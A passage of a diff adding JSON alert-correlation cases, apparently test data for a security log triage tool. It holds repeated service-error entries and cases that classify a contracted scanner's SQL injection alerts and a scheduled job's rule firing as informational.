+    "svc[4]: error 4711",
+    "Service reported an error 4711."
+   ],
+   [
+    "11-12 12:05",
+    "app-04",
+    "200008",
+    5,
+    "-",
+    "-",
+    "svc[5]: error 4711",
+    "Service reported an error 4711."
+   ],
+   [
+    "11-12 12:06",
+    "app-04",
+    "200008",
+    5,
+    "-",
+    "-",
+    "svc[6]: error 4711",
+    "Service reported an error 4711."
+   ],
+   [
+    "11-12 12:07",
+    "app-04",
+    "200008",
+    5,
+    "-",
+    "-",
+    "svc[7]: error 4711",
+    "Service reported an error 4711."
+   ],
+   [
+    "11-12 12:08",
+    "app-04",
+    "200008",
+    5,
+    "-",
+    "-",
+    "svc[8]: error 4711",
+    "Service reported an error 4711."
+   ],
+   [
+    "11-12 12:09",
+    "app-04",
+    "200008",
+    5,
+    "-",
+    "-",
+    "svc[9]: error 4711",
+    "Service reported an error 4711."
+   ],
+   [
+    "11-12 12:10",
+    "app-04",
+    "200008",
+    5,
+    "-",
+    "-",
+    "svc[10]: error 4711",
+    "Service reported an error 4711."
+   ],
+   [
+    "11-12 12:11",
+    "app-04",
+    "200008",
+    5,
+    "-",
+    "-",
+    "svc[11]: error 4711",
+    "Service reported an error 4711."
+   ],
+   [
+    "11-12 12:12",
+    "app-04",
+    "200008",
+    5,
+    "-",
+    "-",
+    "svc[12]: error 4711",
+    "Service reported an error 4711."
+   ],
+   [
+    "11-12 12:13",
+    "app-04",
+    "200008",
+    5,
+    "-",
+    "-",
+    "svc[13]: error 4711",
+    "Service reported an error 4711."
+   ],
+   [
+    "11-12 12:14",
+    "app-04",
+    "200008",
+    5,
+    "-",
+    "-",
+    "svc[14]: error 4711",
+    "Service reported an error 4711."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-020",
+  "pattern": "P7",
+  "score": 0,
+  "entity": "src=45.33.32.200",
+  "hosts": [
+   "web-02"
+  ],
+  "first": "11-14 14:30",
+  "last": "11-14 14:31",
+  "n": 2,
+  "attack": [
+   "T1190"
+  ],
+  "summary": "외부 탐색 2건, 공격 패턴 rule 2건",
+  "known": "contracted scanner",
+  "near": [
+   "CASE-014"
+  ],
+  "severity": "Info",
+  "sev_basis": "정상 업무 등록부 일치",
+  "criterion": "EV-CORR-07",
+  "actor": "host:web-02",
+  "timeline": [
+   [
+    "11-14 14:30",
+    "web-02",
+    "200007",
+    7,
+    "-",
+    "45.33.32.200",
+    "/login",
+    "SQL injection attempt."
+   ],
+   [
+    "11-14 14:31",
+    "web-02",
+    "200007",
+    7,
+    "-",
+    "45.33.32.200",
+    "/login",
+    "SQL injection attempt."
+   ]
+  ]
+ },
+ {
+  "id": "CASE-021",
+  "pattern": "P9",
+  "score": 0,
+  "entity": "rule=200012 actor=-",
+  "hosts": [
+   "app-06"
+  ],
+  "first": "11-15 15:00",
+  "last": "11-15 15:00",
+  "n": 1,
+  "attack": [
+   "T1204"
+  ],
+  "summary": "Unlinked detection rule fired.",
+  "known": "scheduled state change job",
+  "near": [],
+  "severity": "Info",
+  "sev_basis": "정상 업무 등록부 일치",
+  "criterion": "rule=200012",
+  "actor": "host:app-06",
+  "timeline": [
+   [
+    "11-15 15:00",
+    "app-06",
+    "200012",
+    11,
+    "-",
+    "-",
+    "Nov 15 06:00:00 app-06 thing: state changed 42",
+    "Unlinked detection rule fired."
+   ]
+  ]
+ }
+]
